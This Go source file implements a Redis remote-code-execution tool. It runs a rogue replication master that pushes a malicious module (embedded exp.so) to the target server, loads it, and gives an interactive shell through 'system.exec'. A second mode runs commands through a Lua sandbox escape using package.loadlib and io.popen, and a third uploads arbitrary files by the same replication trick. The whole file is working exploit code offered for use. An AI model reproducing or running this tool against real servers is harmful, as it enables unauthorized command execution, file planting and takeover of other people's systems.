package redisrce

import (
	"bufio"
	"context"
	_ "embed"
	"fmt"
	"github.com/go-redis/redis/v8"
	"github.com/zyylhn/redis_rce/utils"
	"io"
	"net"
	"os"
	"strings"
	"sync"
)
//go:embed exp.so
var sopayload []byte
var payload []byte

func RdisExec(client *redis.Client,sopath,dst,lhost string,lport int)  {
	if sopath!=""{
		file,err:=os.Open(sopath)
		checkerr_exit(err)
		payload,err=io.ReadAll(file)
	}else {
		payload=sopayload
	}
	if dst==""{
		dst="/tmp/net.so"
	}
	ReceiveFromRedis(redis_exec(fmt.Sprintf("slaveof %v %v",lhost,lport),client))
	dbfilename,dir:=Getinfomation(client)
	ReceiveFromRedis(redis_exec(fmt.Sprintf("config set dir %v",utils.GetBasePathFromPath(dst)),client))
	ReceiveFromRedis(redis_exec(fmt.Sprintf("config set dbfilename %v",utils.GetFileNameFromPath(dst)),client))
	listen(fmt.Sprintf("%v:%v",lhost,lport))
	Restore(client,dir,dbfilename)   //重置
	s:=redis_exec(fmt.Sprintf("module load %v",dst),client)
	if s=="need unload"{
		fmt.Println(utils.Yellow("Try to unload"))
		ReceiveFromRedis(redis_exec(fmt.Sprintf("module unload system"),client))
		fmt.Println(utils.Yellow("To the load"))
		redis_exec(fmt.Sprintf("module load %v",dst),client)
	}
	reader:=bufio.NewReader(os.Stdin)
	for {
		var cmd string
		cmd,_=reader.ReadString('\n')
		cmd=strings.TrimSpace(cmd)+"\n"
		if cmd=="exit\n"{
			cmd=fmt.Sprintf("rm %v",dst)
			ReceiveFromRedis(runcmd(fmt.Sprintf(cmd),client))
			ReceiveFromRedis(redis_exec(fmt.Sprintf("module unload system"),client))
			break
		}
		ReceiveFromRedis(runcmd(fmt.Sprintf(cmd),client))
	}
	os.Exit(0)

}

func RedisUpload(client *redis.Client,src,dst,lhost string,lport int)  {
	file,err:=os.Open(src)
	checkerr_exit(err)
	payload,err=io.ReadAll(file)
	ReceiveFromRedis(redis_exec(fmt.Sprintf("slaveof %v %v",lhost,lport),client))
	dbfilename,dir:=Getinfomation(client)
	ReceiveFromRedis(redis_exec(fmt.Sprintf("config set dir %v",utils.GetBasePathFromPath(dst)),client))
	ReceiveFromRedis(redis_exec(fmt.Sprintf("config set dbfilename %v",utils.GetFileNameFromPath(dst)),client))
	listen(fmt.Sprintf("%v:%v",lhost,lport))
	Restore(client,dir,dbfilename)   //重置

}

func LuaEval(client *redis.Client)  {
	reader:=bufio.NewReader(os.Stdin)
	for {
		var cmd string
		fmt.Printf(utils.Yellow("#>"))
		cmd,_=reader.ReadString('\n')
		cmd=strings.TrimSpace(cmd)+"\n"
		if cmd=="exit\n"{
			break
		}
		ReceiveFromRedis(luaeval(cmd,client))
	}
	os.Exit(0)
}

func listen(ladd string) {
	var wg sync.WaitGroup
	wg.Add(1)
	tcpip, err := net.ResolveTCPAddr("tcp", ladd)
	checkerr(err)
	tcplisten, err := net.ListenTCP("tcp", tcpip)
	defer tcplisten.Close()
	checkerr(err)
	fmt.Println(utils.Yellow("Start Listener"))
	c, err := tcplisten.AcceptTCP()
	checkerr(err)
	fmt.Println(utils.Yellow("Success connect from " + c.RemoteAddr().String()))
	go sendmessage(&wg,c)
	wg.Wait()
	c.Close()
}

func sendmessage(wg *sync.WaitGroup, c *net.TCPConn) {
	defer wg.Done()
	buf := make([]byte, 1024)
	for {
		n, err := c.Read(buf)
		if err == io.EOF||n==0 {
			fmt.Println(utils.Yellow("组从复制结束，链接关闭"))
			return
		}
		ReceiveFromRedis(string(buf[:n]))
		switch  {
		case strings.Contains(string(buf[:n]),"PING"):
			c.Write([]byte("+PONG\r\n"))
			SendToRedis("+PONG")
		case strings.Contains(string(buf[:n]),"REPLCONF"):
			c.Write([]byte("+OK\r\n"))
			SendToRedis("+OK")
		case strings.Contains(string(buf[:n]),"SYNC"):
			resp:="+FULLRESYNC "+"ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"+" 1"+"\r\n"
			resp+="$"+ fmt.Sprintf("%v",len(payload)) + "\r\n"
			respb:=[]byte(resp)
			respb=append(respb,payload...)
			respb=append(respb,[]byte("\r\n")...)
			c.Write(respb)
			SendToRedis(resp)
		}
	}
}


func redis_exec(cmd string,client *redis.Client) string {
	ctx:=context.Background()
	var argsinterface []interface{}
	args:=strings.Fields(cmd)
	for _,arg:=range args{
		argsinterface=append(argsinterface,arg)
	}
	SendToRedis(cmd)
	val, err := client.Do(ctx,argsinterface...).Result()
	return redis_checkerr(val, err)
}

func runcmd(cmd string,client *redis.Client) string {
	ctx:=context.Background()
	SendToRedis(cmd)
	val, err := client.Do(ctx,"system.exec",cmd).Result()
	return redis_checkerr(val, err)
}

func luaeval(cmd string,client *redis.Client) string {
	ctx:=context.Background()
	SendToRedis(cmd)
	val, err := client.Do(ctx,"eval",fmt.Sprintf(`local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("%v", "r"); local res = f:read("*a"); f:close(); return res`,cmd),"0").Result()
	return redis_checkerr(val, err)
}

func redis_checkerr(val interface{},err error) string {
	if err != nil {
		if err == redis.Nil {
			fmt.Println(utils.Red("Key does not exits"))
			return ""
		}
		fmt.Println(utils.Red(err))
		if err.Error()=="ERR Error loading the extension. Please check the server logs."{
			return "need unload"
		}
		os.Exit(0)
	}
	switch v:=val.(type){
	case string:
		return v
	case []string:
		return "list result:"+strings.Join(v," ")
	case []interface{}:
		s:=""
		for _,i:=range v{
			s+=i.(string)+" "
		}
		return s
	}
	return ""
}

func Getdir(dirResult string) string {
	if strings.HasPrefix(dirResult,"dir"){
		return dirResult[4:len(dirResult)-1]
	}
	return ""
}

func GetDbfilename(name string) string {
	if strings.HasPrefix(name,"dbfilename"){
		return name[11:len(name)-1]
	}
	return ""
}

func checkerr(err error)  {
	if err!=nil{
		fmt.Println(utils.Red(err))
	}
}
func checkerr_exit(err error)  {
	if err!=nil{
		fmt.Println(utils.Red(err))
		os.Exit(0)
	}
}

func SendToRedis(str string) {
	str=strings.TrimSpace(str)
	fmt.Printf(utils.LightCyan(fmt.Sprintf("--->:%v\n",str)))
}

func ReceiveFromRedis(str string)  {
	str=strings.TrimSpace(str)
	fmt.Printf(utils.LightGreen(fmt.Sprintf("<---:\n%v\n",str)))
}

func Restore(client *redis.Client,dir,dbfilename string)  {
	success:=redis_exec("slaveof no one",client)
	ReceiveFromRedis(success)
	if strings.Contains(success,"OK"){
		fmt.Println(utils.LightGreen("Success upload file"))
	}
	ReceiveFromRedis(redis_exec(fmt.Sprintf("config set dir %v",dir),client))
	ReceiveFromRedis(redis_exec(fmt.Sprintf("config set dbfilename %v",dbfilename),client))
}

func Getinfomation(client *redis.Client) (string,string) {
	dbfilenameResult:=redis_exec("config get dbfilename",client)
	dbfilename:=GetDbfilename(dbfilenameResult)
	if dbfilename!=""{
		ReceiveFromRedis(dbfilenameResult)
	}else {
		fmt.Println(utils.Red("err:"+dbfilenameResult))
	}
	dirResult:=redis_exec("config get dir",client)
	dir:=Getdir(dirResult)
	if dir!=""{
		ReceiveFromRedis(dirResult)
	}else {
		fmt.Println(utils.Red("err:"+dirResult))
	}
	return dbfilename,dir
}